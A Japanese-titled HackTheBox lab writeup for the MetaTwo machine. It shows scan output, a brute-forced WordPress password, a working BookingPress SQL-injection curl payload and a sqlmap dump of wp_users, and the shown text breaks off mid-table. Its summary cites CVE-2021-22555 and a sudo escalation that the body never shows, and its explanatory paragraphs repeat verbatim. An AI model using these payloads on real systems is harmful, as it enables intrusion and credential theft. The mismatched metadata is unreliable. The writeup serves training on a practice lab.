---
title: "HackTheBox - MetaTwo 解説 (Linux)"
date: 2026-02-27
description: "HackTheBox MetaTwo Linux writeup マシン解説。サービス列挙・初期足がかり・権限昇格経路を解説。"
categories: [HackTheBox, Linux]
tags: [php, privilege-escalation, rce, suid]
mermaid: true
content_lang: ja
alt_en: /posts/htb-metatwo/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | 21/tcp (ftp?), 22/tcp (ssh), 80/tcp (http) |
| 主な侵入経路 | Public exploit path involving CVE-2021-22555 |
| 権限昇格経路 | Credentialed access -> sudo policy abuse -> elevated shell |

## 偵察

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:11][MEM:41][TUN0:10.10.14.41][/home/n0z0]
🐉 cat ~/tools/taotie_result/20250216-043212_10.129.228.95.txt 
[*] スキャン開始: 10.129.228.95
[*] Nmapによるポートスキャンを実行...
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 04:32 JST
Warning: 10.129.228.95 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.228.95
Host is up (0.26s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   284.20 ms 10.10.14.1
2   284.29 ms 10.129.228.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1118.58 seconds
[*] Webサーバーを検出、ディレクトリスキャンを実行...
[*] Niktoスキャン実行中...
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.228.95
+ Target Hostname:    10.129.228.95
+ Target Port:        80
+ Start Time:         2025-02-16 04:50:51 (GMT9)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://metapress.htb/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 4846 requests: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-02-16 05:16:52 (GMT9) (1561 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
[*] Feroxbusterスキャン実行中...
[*] SQLMapスキャン実行中...
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:16:53 /2025-02-16/

[05:16:53] [INFO] testing connection to the target URL
got a 302 redirect to 'http://metapress.htb/'. Do you want to follow? [Y/n] Y
[05:16:54] [INFO] testing if the target URL content is stable
[05:16:54] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')

[*] ending @ 05:16:54 /2025-02-16/

```

Port scan results are shown below.
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:1][MEM:24][TUN0:10.10.14.41][/home/n0z0]
🐉 grc nmap -p- -sC -sV -T4 -A -Pn $ip         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 02:45 JST
Warning: 10.129.228.95 giving up on port because retransmission cap hit (6).
Nmap scan report for metapress.htb (10.129.228.95)
Host is up (0.31s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: MetaPress &#8211; Official company site
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-generator: WordPress 5.6.2
|_http-server-header: nginx/1.18.0
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   351.57 ms 10.10.14.1
2   351.61 ms metapress.htb (10.129.228.95)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2005.20 seconds

```

ftp
ssh
http
┗nginx
┗PHP
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
❌[CPU:1][MEM:47][IP:dead:beef:2::1027][/home/n0z0]
🐉 feroxbuster -u http://metapress.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -x php,html,txt -r --timeout 3 --no-state -s 200,301 -e -E

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://metapress.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 301]
 💥  Timeout (secs)        │ 3
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt]
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       97l      429w     6931c http://metapress.htb/wp-login.php?redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&reauth=1
200      GET      178l      321w     2897c http://metapress.htb/wp-content/themes/twentytwentyone/assets/css/print.css
200      GET       36l      150w     1127c http://metapress.htb/wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js
200      GET       42l      145w     1057c http://metapress.htb/wp-content/themes/twentytwentyone/assets/js/polyfills.js
200      GET        2l       15w     1426c http://metapress.htb/wp-includes/js/wp-embed.min.js
200      GET      184l      700w     5705c http://metapress.htb/wp-content/themes/twentytwentyone/assets/js/primary-navigation.js
200      GET       43l       43w     1045c http://metapress.htb/wp-includes/wlwmanifest.xml
200      GET        1l       37w     2297c http://metapress.htb/wp-includes/css/dist/block-library/theme.min.css
200      GET       11l      742w    51338c http://metapress.htb/wp-includes/css/dist/block-library/style.min.css
200      GET        2l       17w     1077c http://metapress.htb/wp-includes/js/wp-util.min.js
200      GET        2l      209w     9532c http://metapress.htb/wp-includes/js/dist/i18n.min.js
200      GET        1l       22w      867c http://metapress.htb/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js
200      GET        2l      378w    11224c http://metapress.htb/wp-includes/js/jquery/jquery-migrate.min.js
200      GET        1l       13w      353c http://metapress.htb/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js
200      GET        1l        8w      417c http://metapress.htb/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js
200      GET        2l       10w      352c http://metapress.htb/wp-includes/js/zxcvbn-async.min.js
200      GET        2l       29w     1119c http://metapress.htb/wp-admin/js/password-strength-meter.min.js
200      GET        1l      195w     7908c http://metapress.htb/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js
200      GET       17l      209w     7165c http://metapress.htb/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js
200      GET        2l      173w     5845c http://metapress.htb/wp-includes/css/buttons.min.css
200      GET        2l      117w     2477c http://metapress.htb/wp-admin/css/l10n.min.css
200      GET        2l      182w     5486c http://metapress.htb/wp-admin/css/login.min.css
200      GET        2l       67w     5463c http://metapress.htb/wp-admin/js/user-profile.min.js
200      GET     5870l    12390w   152103c http://metapress.htb/wp-content/themes/twentytwentyone/style.css
200      GET        1l     4351w    93427c http://metapress.htb/wp-json
200      GET        2l      578w    25081c http://metapress.htb/wp-admin/css/forms.min.css
200      GET        2l      349w    16058c http://metapress.htb/wp-includes/js/underscore.min.js
200      GET      155l      552w    10342c http://metapress.htb/
200      GET       97l      429w     6931c http://metapress.htb/wp-login.php
200      GET        1l      607w    47085c http://metapress.htb/wp-includes/js/dist/vendor/wp-polyfill-url.min.js
200      GET        1l     2102w    99310c http://metapress.htb/wp-includes/js/dist/vendor/wp-polyfill.min.js
200      GET        2l       12w    59010c http://metapress.htb/wp-includes/css/dashicons.min.css
200      GET        3l     1298w    89496c http://metapress.htb/wp-includes/js/jquery/jquery.min.js
200      GET      153l      534w    10326c http://metapress.htb/about-us/
200      GET       50l      114w     1763c http://metapress.htb/feed/
200      GET     1033l     3343w    74090c http://metapress.htb/events/
200      GET        0l        0w        0c http://metapress.htb/wp-content/
200      GET      384l     3177w    19915c http://metapress.htb/license.txt
200      GET      381l      755w     6017c http://metapress.htb/wp-admin/css/install.css
200      GET       13l       78w     4373c http://metapress.htb/wp-admin/images/wordpress-logo.png
200      GET       97l      823w     7278c http://metapress.htb/readme.html
200      GET        0l        0w   147320c http://metapress.htb/wp-includes/js/dist/data.js
200      GET      801l     2636w    25628c http://metapress.htb/wp-includes/js/dist/plugins.js
200      GET        0l        0w   236092c http://metapress.htb/wp-includes/js/dist/date.js
200      GET     1533l     5320w    45647c http://metapress.htb/wp-includes/js/dist/url.js
200      GET      204l      799w     4665c http://metapress.htb/wp-includes/js/utils.js
200      GET      329l     1286w    10371c http://metapress.htb/wp-includes/js/dist/warning.js
200      GET      592l     2426w    22119c http://metapress.htb/wp-includes/js/dist/notices.js
200      GET        0l        0w   489123c http://metapress.htb/wp-includes/js/dist/editor.js
200      GET     1523l     5968w    50803c http://metapress.htb/wp-includes/js/dist/dom.js
200      GET     1404l     5526w    43327c http://metapress.htb/wp-includes/js/dist/i18n.js
200      GET      973l     3159w    29493c http://metapress.htb/wp-includes/js/clipboard.js
200      GET     2096l     9725w    77794c http://metapress.htb/wp-includes/js/backbone.js
[>-------------------] - 19m  2409224/191498258 19h     found:53      errors:224763 
[>-------------------] - 19m    93156/6793696 80/s    http://metapress.htb/ 
[>-------------------] - 19m    93328/5095272 81/s    http://metapress.htb/wp-content/themes/ 
[>-------------------] - 19m    92716/5095272 80/s    http://metapress.htb/wp-content/ 
[>-------------------] - 19m    92636/5095272 80/s    http://metapress.htb/about-us/ 
[>-------------------] - 19m    92664/5095272 80/s    http://metapress.htb/feed/ 
[>-------------------] - 19m    93076/5095272 81/s    http://metapress.htb/comments/feed/ 
[>-------------------] - 19m    92912/5095272 80/s    http://metapress.htb/hello-world/ 
[>-------------------] - 19m    92716/5095272 80/s    http://metapress.htb/events/ 
[>-------------------] - 19m    92596/5095272 80/s    http://metapress.htb/category/news/ 
[>-------------------] - 19m    92032/5095272 81/s    http://metapress.htb/wp-content/uploads/ 
[>-------------------] - 19m    90176/5095272 81/s    http://metapress.htb/wp-includes/ 
[>-------------------] - 18m    89348/5095272 81/s    http://metapress.htb/wp-includes/images/ 
[>-------------------] - 18m    88888/5095272 81/s    http://metapress.htb/wp-includes/images/media/ 
[>-------------------] - 18m    88744/5095272 81/s    http://metapress.htb/wp-includes/assets/ 
[>-------------------] - 18m    88612/5095272 81/s    http://metapress.htb/wp-content/upgrade/ 
[>-------------------] - 18m    87776/5095272 82/s    http://metapress.htb/wp-includes/css/ 
[>-------------------] - 18m    86860/5095272 81/s    http://metapress.htb/wp-includes/images/smilies/ 
[>-------------------] - 18m    86052/5095272 82/s    http://metapress.htb/wp-includes/js/ 
[>-------------------] - 17m    82748/5095272 82/s    http://metapress.htb/wp-includes/widgets/ 
[>-------------------] - 17m    81364/5095272 81/s    http://metapress.htb/wp-includes/css/dist/ 
[>-------------------] - 16m    79804/5095272 82/s    http://metapress.htb/wp-includes/js/dist/ 
[>-------------------] - 16m    78492/5095272 82/s    http://metapress.htb/wp-includes/fonts/ 
[>-------------------] - 16m    77588/5095272 82/s    http://metapress.htb/wp-includes/customize/ 
[>-------------------] - 14m    71156/5095272 82/s    http://metapress.htb/wp-includes/certificates/ 
[>-------------------] - 13m    64788/5095272 82/s    http://metapress.htb/wp-content/uploads/2025/ 
[>-------------------] - 11m    57108/5095272 83/s    http://metapress.htb/wp-includes/Text/ 
[>-------------------] - 9m     47496/5095272 85/s    http://metapress.htb/wp-includes/sitemaps/ 
[>-------------------] - 9m     44180/5095272 84/s    http://metapress.htb/wp-content/uploads/2022/ 
[>-------------------] - 6m     29948/5095272 84/s    http://metapress.htb/wp-includes/js/tinymce/ 
[>-------------------] - 2m      9496/5095272 87/s    http://metapress.htb/wp-includes/sitemaps/providers/                                            ^C

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
❌[CPU:8][MEM:32][TUN0:10.10.14.41][/home/n0z0]
🐉 wpscan --url http://metapress.htb --plugins-detection aggressive --disable-tls-checks --enumerate u,t,p 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.129.228.95]
[+] Started: Fri Mar  7 03:30:40 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:08 <=========================================================> (1500 / 1500) 100.00% Time: 00:02:08

[i] No plugins Found.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:35 <===========================================================> (400 / 400) 100.00% Time: 00:00:35
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://metapress.htb/wp-content/themes/twentytwentyone/, status: 500
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Mar  7 03:33:28 2025
[+] Requests Done: 1914
[+] Cached Requests: 55
[+] Data Sent: 510.11 KB
[+] Data Received: 729.604 KB
[+] Memory used: 241.973 MB
[+] Elapsed time: 00:02:48

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
🐉 wpscan --url http://metapress.htb -U admin,manager -P /usr/share/wordlists/rockyou.txt -t 30
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.129.228.95]
[+] Started: Mon Mar  3 20:39:00 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=======================================================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - manager / partylikearockstar
```

![Screenshot showing exploitation evidence on metatwo (step 1)](/assets/img/htb/metatwo/Pasted%20image%2020250307034843.png)
*Caption: Screenshot captured during metatwo at stage 1 of the attack chain.*

![Screenshot showing exploitation evidence on metatwo (step 2)](/assets/img/htb/metatwo/Pasted%20image%2020250307035105.png)
*Caption: Screenshot captured during metatwo at stage 2 of the attack chain.*

`bookingpress_element_theme.css?ver=1.0.10' media='all' />
![Screenshot showing exploitation evidence on metatwo (step 3)](/assets/img/htb/metatwo/Pasted%20image%2020250307040137.png)
*Caption: Screenshot captured during metatwo at stage 3 of the attack chain.*

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:22][MEM:34][TUN0:10.10.14.41][/home/n0z0]
🐉 curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=398e4fd1fc&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 06 Mar 2025 19:10:54 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]                                      
```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
✅[CPU:8][MEM:44][TUN0:10.10.14.41][...ome/n0z0/work/htb/MetaTwo]
🐉 sqlmap -r sql.req -p total_service -D blog -T wp_users --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:39:52 /2025-03-07/

[04:39:52] [INFO] parsing HTTP request from 'sql.req'
[04:39:52] [INFO] resuming back-end DBMS 'mysql' 
[04:39:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
Parameter: total_service (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=398e4fd1fc&category_id=33&total_service=1) AND (SELECT 9146 FROM (SELECT(SLEEP(5)))jeSt) AND (1485=1485

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=398e4fd1fc&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,CONCAT(0x71786a6b71,0x496c496177416c7674467867745178474f4276685479654d51514b62467a7a4352655663546e4854,0x717a7a7a71),NULL,NULL,NULL,NULL,NULL,NULL-- -
[04:39:52] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[04:39:52] [INFO] fetching columns for table 'wp_users' in database 'blog'
[04:39:53] [INFO] fetching entries for table 'wp_users' in database 'blog'
[04:39:53] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[04:39:55] [INFO] writing hashes to a temporary file '/tmp/sqlmap_aes8e41298430/sqlmaphashes-n_el8y72.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[04:39:56] [INFO] using hash method 'phpass_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/smalldict.txt' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[04:39:58] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[04:39:59] [INFO] starting dictionary-based cracking (phpass_passwd)
[04:39:59] [INFO] starting 8 processes                                                                                                
[04:55:28] [INFO] using suffix '@'                                                                                                        
[04:55:41] [WARNING] no clear password(s) found                                                                                           
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
